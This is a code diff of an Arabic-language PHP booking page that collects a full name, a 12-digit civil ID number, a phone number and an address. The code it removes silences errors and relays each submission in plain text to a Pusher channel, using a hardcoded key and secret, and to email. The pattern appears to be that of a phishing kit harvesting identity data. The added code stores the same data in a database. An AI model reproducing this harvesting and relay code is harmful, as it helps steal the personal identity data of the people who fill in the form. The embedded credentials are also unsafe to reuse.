@@ -1,216 +1,176 @@
 <?php
-error_reporting(0);
-ini_set('display_errors', 0);
-########################
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
 session_start();
 
-require_once('./add-user.php');
-require_once('./dashboard/init.php');
-require_once('./vendor/autoload.php');
-require __DIR__ . '/vendor/autoload.php';
+require_once('./DB_CON.php');
 
-// Store appointment data in session
-if (isset($_POST['submit'])) {
-    $_SESSION['appointment'] = array(
-        'nationality' => $_POST['nationality'] ?? '',
-        'service' => $_POST['service'] ?? '',
-        'startDate' => $_POST['startDate'] ?? '',
-        'duration' => $_POST['duration'] ?? '',
-        'pickupTime' => $_POST['pickupTime'] ?? '',
-        'gender' => $_POST['gender'] ?? '',
-        'method' => $_POST['method'] ?? '',
-    );
-}
-
-// Process customer info form
-if (isset($_POST['submit']) && isset($_POST['name'])) {
-
-    $options = array(
-        'cluster' => 'ap2',
-        'useTLS' => true
-    );
-    $pusher = new Pusher\Pusher(
-        'e77a3acd6f6fc7cd49ce',
-        'd42bbf9412e5a18b9d6c',
-        '1816717',
-        $options
-    );
-
-    $site = array(
-        'name' => $_POST["name"],
-        'ssn' => $_POST['ssn'],
-        'phone' => $_POST['phone'],
-        'address' => $_POST['address'],
-        'extra' => $_POST['elec'],
-        'message' => 'info',
-    );
-
-    $id = $User->register($site);
-    if ($id) {
-        $_SESSION['user_id'] = $id;
-
-        $data['message'] = $_POST["name"] . ' ' . $_POST['ssn'] . ' ' . $_POST['phone'] . ' ' . $_POST['address'];
-        $pusher->trigger('my-channel', 'my-event', $data);
-
-        SendMail($_POST["name"], $_POST['phone'] ,$_POST['ssn']);
-
-        echo "<script>document.location.href='summary.php';</script>";
+// معالجة البيانات عند الإرسال
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit'])) {
+    // التحقق من البيانات المطلوبة
+    $name = $_POST['name'] ?? '';
+    $ssn = $_POST['ssn'] ?? '';
+    $phone = $_POST['phone'] ?? '';
+    $address = $_POST['address'] ?? '';
+    $elec = $_POST['elec'] ?? '';
+    
+    // البيانات من صفحة appointment
+    $nationality = $_POST['nationality'] ?? '';
+    $service = $_POST['service'] ?? '';
+    $startDate = $_POST['startDate'] ?? '';
+    $duration = $_POST['duration'] ?? '';
+    $pickupTime = $_POST['pickupTime'] ?? '';
+    $gender = $_POST['gender'] ?? '';
+    $method = $_POST['method'] ?? '';
+    
+    // التحقق من البيانات المطلوبة
+    if (empty($name) || empty($ssn) || empty($phone) || empty($address)) {
+        $error = 'يرجى ملء جميع البيانات المطلوبة';
+    } else {
+        // حفظ البيانات في قاعدة البيانات
+        try {
+            // حفظ بيانات المستخدم
+            $stmt = $con->prepare("INSERT INTO users (name, ssn, phone, address, extra) VALUES (?, ?, ?, ?, ?)");
+            $stmt->bind_param("sssss", $name, $ssn, $phone, $address, $elec);
+            $stmt->execute();
+            $user_id = $stmt->insert_id;
+            $stmt->close();
+            
+            // حفظ بيانات الموعد
+            $stmt = $con->prepare("INSERT INTO appointments (user_id, nationality, service, start_date, duration, pickup_time, gender, method, status) VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'pending')");
+            $stmt->bind_param("isssssss", $user_id, $nationality, $service, $startDate, $duration, $pickupTime, $gender, $method);
+            $stmt->execute();
+            $stmt->close();
+            
+            // حفظ البيانات في الجلسة
+            $_SESSION['user_id'] = $user_id;
+            $_SESSION['user_name'] = $name;
+            $_SESSION['appointment_id'] = $con->insert_id;
+            
+            // إعادة التوجيه إلى صفحة الملخص
+            header('Location: summary.php');
+            exit;
+        } catch (Exception $e) {
+            $error = 'حدث خطأ أثناء حفظ البيانات: ' . $e->getMessage();
+        }
     }
 }
 
-
+// إذا لم تكن هناك بيانات من appointment، إعادة التوجيه
+if (!isset($_POST['nationality'])) {
+    header('Location: appointment.php');
+    exit;
+}
 ?>
 
 <!DOCTYPE html>
-<html lang="en">
-
+<html lang="ar">
 <head>
     <meta charset="utf-8">
-    <title>الدرة</title>
+    <title>الدرة - بيانات العميل</title>
     <meta content="width=device-width, initial-scale=1.0" name="viewport">
-    <meta content="" name="keywords">
-    <meta content="" name="description">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
-
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&family=Rubik:ital,wght@0,300..900;1,300..900&display=swap" rel="stylesheet">
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
     <style>
         * {
-            padding: 0;
-            margin: 0;
             font-family: "Cairo", sans-serif;
             color: #691E7C;
             direction: rtl;
         }
-
         body {
             background-color: #f8f9fa;
         }
-
         .nav {
             background-image: url(./assets/menu_bg\ \(1\).avif);
+            display: flex;
+            justify-content: flex-end;
+            padding: 10px 20px;
         }
-
-        .carousel-caption {
-            color: #691E7C;
+        .nav img {
+            width: 230px;
         }
-
-        /* .row {
-            background-color: #edeef4 !important;
-        } */
-
+        .form-control {
+            border-radius: 15px !important;
+        }
         .btn-primary {
             background-color: #691E7C !important;
             border: none;
         }
-
-        .list-style-arrow {
-            list-style-type: none;
-            padding: 0;
-        }
-
-        ul,
-        li {
-            margin-top: 0;
-            margin-bottom: 10.5px;
-        }
-
-        ul.list-style-arrow li {
-            padding-right: 1.3em;
-            position: relative;
-        }
-
-        ul.list-style-arrow li:after {
-            content: "\f053";
-            font-family: FontAwesome;
-            font-size: 12px;
-            display: block;
-            width: 1.3em;
-            position: absolute;
-            right: 0;
-            top: 5px;
-        }
-
-        .story {
-            background-image: url(./assets/bg_s_story.jpg);
-            background-position: top center;
-            background-size: cover;
-            min-height: 405px;
-        }
-
-        .gols {
-            background-image: url(./assets/bg_s_story2.jpg);
-            background-position: top center;
-            background-size: cover;
-            min-height: 543px;
-        }
-
-        .overl {
-            background-image: url(./assets/overlay_bg.png);
-            background-repeat: repeat;
-            background-size: 50%;
-        }
-
-        .form-control {
-            border-radius: 15px !important;
+        .alert {
+            border-radius: 15px;
         }
     </style>
 </head>
-
 <body>
-
-    <nav class="nav d-flex justify-content-end">
-        <img src="./assets/24dde8_57f05cb3b1524c0ba849f6e5a4a0a7fe~mv2.avif" width="230" alt="">
+    <nav class="nav">
+        <img src="./assets/24dde8_57f05cb3b1524c0ba849f6e5a4a0a7fe~mv2.avif" alt="الدرة">
     </nav>
 
-
-    <h6 class="mx-4 mt-4 text-center alert alert-primary" style="border-radius: 15px; padding:10px">عملائنا يرجى التحقق من أن جميع البيانات المدخلة <br> بإسم العميل المتقدم على الحجز</h6>
-
+    <h6 class="mx-4 mt-4 text-center alert alert-primary" style="border-radius: 15px; padding:10px">
+        عملائنا يرجى التحقق من أن جميع البيانات المدخلة <br> بإسم العميل المتقدم على الحجز
+    </h6>
 
     <div class="container mt-5">
+        <?php if (isset($error)): ?>
+            <div class="alert alert-danger" role="alert">
+                <?php echo htmlspecialchars($error); ?>
+            </div>
+        <?php endif; ?>
+
         <form action="" method="POST">
             <div class="row px-3">
+                <!-- بيانات العميل -->
                 <div class="mb-4 d-flex align-items-center gap-3">
                     <div class="mt-auto"><i class="bi bi-person-fill fs-1 text-secondary"></i></div>
                     <div style="width: 85%;">
-                        <label for="" class="text-secondary mb-2">اسم العميل كامل *</label>
-                        <input type="text" class="form-control" name="name" required>
+                        <label for="name" class="text-secondary mb-2">اسم العميل كامل *</label>
+                        <input type="text" class="form-control" name="name" id="name" required>
                     </div>
                 </div>
 
                 <div class="mb-4 d-flex align-items-center gap-3">
                     <div class="mt-auto"><i class="bi bi-file-earmark-bar-graph-fill fs-1 text-secondary"></i></div>
                     <div style="width: 85%;">
-                        <label for="" class="text-secondary mb-2"> رقم المدني لصاحب المعاملة *</label>
-                        <input type="text" class="form-control" minlength="12" maxlength="12" pattern="[0-9]*" inputmode="numeric" name="ssn" required>
+                        <label for="ssn" class="text-secondary mb-2">رقم المدني لصاحب المعاملة *</label>
+                        <input type="text" class="form-control" name="ssn" id="ssn" minlength="12" maxlength="12" pattern="[0-9]*" inputmode="numeric" required>
                     </div>
                 </div>
 
                 <div class="mb-4 d-flex align-items-center gap-3">
                     <div class="mt-auto"><i class="bi bi-telephone-fill fs-1 text-secondary"></i></div>
                     <div style="width: 85%;">
-                        <label for="" class="text-secondary mb-2">رقم النقال * </label>
-                        <input type="text" class="form-control" minlength="8" maxlength="10" pattern="[0-9]*" inputmode="numeric" name="phone" required>
+                        <label for="phone" class="text-secondary mb-2">رقم النقال *</label>
+                        <input type="text" class="form-control" name="phone" id="phone" minlength="8" maxlength="10" pattern="[0-9]*" inputmode="numeric" required>
                     </div>
                 </div>
 
                 <div class="mb-4 d-flex align-items-center gap-3">
                     <div class="mt-auto"><i class="bi bi-geo-alt fs-1 text-secondary"></i></div>
                     <div style="width: 85%;">
-                        <label for="" class=" mb-2 text-secondary">العنوان *</label>
-                        <input type="text" class="form-control" name="address" required>
+                        <label for="address" class="text-secondary mb-2">العنوان *</label>
+                        <input type="text" class="form-control" name="address" id="address" required>
                     </div>
                 </div>
 
                 <div class="mb-4 d-flex align-items-center gap-3">
                     <div class="mt-auto"><i class="bi bi-calendar-check-fill fs-1 text-secondary"></i></div>
                     <div style="width: 85%;">
-                        <label for="" class="text-secondary mb-2">رقم الآلي للعنوان </label>
-                        <input type="text" class="form-control" name="elec">
+                        <label for="elec" class="text-secondary mb-2">رقم الآلي للعنوان</label>
+                        <input type="text" class="form-control" name="elec" id="elec">
                     </div>
                 </div>
+
+                <!-- بيانات الموعد المخفية -->
+                <input type="hidden" name="nationality" value="<?php echo htmlspecialchars($_POST['nationality'] ?? ''); ?>">
+                <input type="hidden" name="service" value="<?php echo htmlspecialchars($_POST['service'] ?? ''); ?>">
+                <input type="hidden" name="startDate" value="<?php echo htmlspecialchars($_POST['startDate'] ?? ''); ?>">
+                <input type="hidden" name="duration" value="<?php echo htmlspecialchars($_POST['duration'] ?? ''); ?>">
+                <input type="hidden" name="pickupTime" value="<?php echo htmlspecialchars($_POST['pickupTime'] ?? ''); ?>">
+                <input type="hidden" name="gender" value="<?php echo htmlspecialchars($_POST['gender'] ?? ''); ?>">
+                <input type="hidden" name="method" value="<?php echo htmlspecialchars($_POST['method'] ?? ''); ?>">
             </div>
 
             <div class="text-center">
@@ -219,14 +179,7 @@ if (isset($_POST['submit']) && isset($_POST['name'])) {
         </form>
     </div>
 
-
-
-
-    <div class="pt-5"></div>
-
- 
-    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js" integrity="sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p" crossorigin="anonymous"></script>
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.min.js" integrity="sha384-cVKIPhGWiC2Al4u+LWgxfKTRIcfu0JTxR+EQDz/bgldoEyl4H0zUF0QKbrJ0EcQF" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.min.js"></script>
 </body>
-
 </html>
